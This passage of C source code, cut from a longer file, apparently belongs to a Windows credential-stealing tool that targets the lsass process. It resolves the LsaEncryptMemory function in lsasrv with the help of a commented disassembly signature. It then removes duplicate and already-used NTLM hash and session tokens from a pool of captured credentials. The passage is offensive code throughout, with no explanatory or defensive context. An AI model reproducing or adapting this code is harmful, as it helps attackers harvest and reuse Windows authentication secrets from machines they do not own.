		DEBUG("+lsass> Service Pack 0 Found.");
#endif



	} else {
		// Error - FIXME
#ifdef DEBUG_OUT
		DEBUG("+lsass> Error in determining LsaEncryptMemory function. Halting all threads");
#endif
		BREAK;
	}*/

	//BREAK;

	// Get lsasrv base
	
	// Locate our target function signature
	/*
.text:7573FDEC 000 8B FF                   mov     edi, edi
.text:7573FDEE 000 55                      push    ebp
.text:7573FDEF 004 8B EC                   mov     ebp, esp
.text:7573FDF1 004 81 EC 10 01 00 00       sub     esp, 110h
.text:7573FDF7 114 A1 58 01 7D 75          mov     eax, ___security_cookie
.text:7573FDFC 114 56                      push    esi
.text:7573FDFD 118 8B 75 08                mov     esi, [ebp+arg_0]
.text:7573FE00 118 85 F6                   test    esi, esi
.text:7573FE02 118 89 45 FC                mov     [ebp+var_4]
	*/

	LsaEncryptMemory = (void (WINAPI *)(unsigned int *, unsigned int, unsigned int))ptr;
	//DEBUG("Found cbc_function @ 0x%08x", ptr);

#ifdef DEBUG_OUT
	DEBUG("+lsass> Found LsaEncryptMemory at 0x%08x", (DWORD)LsaEncryptMemory);
#endif

	return;
}

VOID lsass5_remove_dup_tokens(PNTLM_TOKEN ntlm_tokens[MAX_TOKENS])
{
	DWORD			*token1, *token2;
	HANDLE			heap_tmp;
	char			ntlm_pass[] = NTLM_PASS;
	unsigned int	i;

remove_dup:
	token1 = (PDWORD)&ntlm_tokens[0];

	while (TRUE) {

		token2 = token1;
		while (TRUE) {
			if (*token1 == *token2) {
				token2++;
				continue;
			}

			if (*token2 == 0) {
				break;
			}

			// Compare ntlm/session
			if (!memory_compare(((PNTLM_TOKEN)(*token1))->ntlm, ((PNTLM_TOKEN)(*token2))->ntlm, 16)
				&& !memory_compare(((PNTLM_TOKEN)(*token1))->session, ((PNTLM_TOKEN)(*token2))->session, 16)) {
				// Two names are equal, therefore token2 is a duplicate
				//DEBUG("+lsass> Duplicate token 0x%08x found", token2);

				// If this is a husk token, do not remove
				if (!memory_compare(((PNTLM_TOKEN)(*token2))->ntlm, ntlm_pass, 16)) {
					token2++;
					continue;
				}

				// Free token memory FIXME - memory leak
				//HeapFree((HANDLE)((PNTLM_TOKEN)token2)->heap, 0, (LPVOID)((PNTLM_TOKEN)token2)->decrypted_token);
				//heap_tmp = ((PNTLM_TOKEN)token2)->heap;
				//HeapFree(((PNTLM_TOKEN)token2)->heap, 0, token2);
				//HeapDestroy(heap_tmp);

				// Remove dup
				while (TRUE) {
					*token2 = 0;
					*token2 = *(PDWORD)((DWORD_PTR)token2 + 4);
					token2++;

					if (*token2 == 0) {
						break;
					}
				}

				goto remove_dup;
			}

			token2++;
		}

		token1++;

		if (*token1 == 0) {
			break;
		}
	}

	return;
}

VOID lsass5_remove_used_tokens(PDWORD token_pool, PNTLM_TOKEN ntlm_tokens[MAX_TOKENS])
{
	PDWORD			hash;
	PDWORD			token;
	HANDLE			heap;
	UINT			i;

	//BREAK;

	// Iterate by hash. If x token matches the hash, remove the token
remove_hash:
	hash = token_pool;
	while (TRUE) {

		if ((*hash == 0) && (*(PDWORD)((DWORD_PTR)hash + NTLM_HASH_SIZE) == 0)) {
			break;
		}

		// Go through all tokens
		i = 0;
		while (ntlm_tokens[i] != NULL) {

			// Does it match?
			if (!memory_compare(ntlm_tokens[i]->session, hash, 32)) {

				// Deallocate token memory
				heap = ntlm_tokens[i]->heap;
				HeapFree(heap, 0, ntlm_tokens[i]->decrypted_token);
				HeapFree(heap, 0, ntlm_tokens[i]);
				HeapDestroy(heap);

				if ((i == 0) && (ntlm_tokens[1] == NULL)) {
					ZeroMemory(ntlm_tokens, sizeof(PNTLM_TOKEN) * MAX_TOKENS);
					return;
				}

				// Remove the element
				token = (PDWORD)&ntlm_tokens[i];
				while (TRUE) {

					*token = *(PDWORD)((DWORD_PTR)token + sizeof(DWORD_PTR));
					*(PDWORD)((DWORD_PTR)token + sizeof(DWORD_PTR)) = NULL;

					token++;

					if (*(PDWORD)((DWORD_PTR)token + sizeof(DWORD_PTR)) == NULL) {
						goto remove_hash;
					}
				}
			}

			i++;
		}

		// Increment to next hash
		hash = (PDWORD)((DWORD_PTR)hash + 32);
	}
	
	return;
}

